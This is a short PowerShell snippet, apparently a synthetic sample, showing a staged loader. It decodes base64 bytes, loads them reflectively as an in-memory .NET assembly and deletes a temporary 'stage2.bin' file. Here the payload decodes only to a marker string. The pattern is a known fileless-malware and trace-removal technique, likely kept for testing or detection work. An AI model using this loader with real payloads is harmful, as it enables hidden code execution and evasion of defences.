
<# Staged execution #> $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpuMDZwN2k1bHJo"); Write-Verbose ("Assembly bytes: " + $StageBytes.Length); [Reflection.Assembly]::Load($StageBytes); Remove-Item -Path "$env:TEMP\stage2.bin" -Force
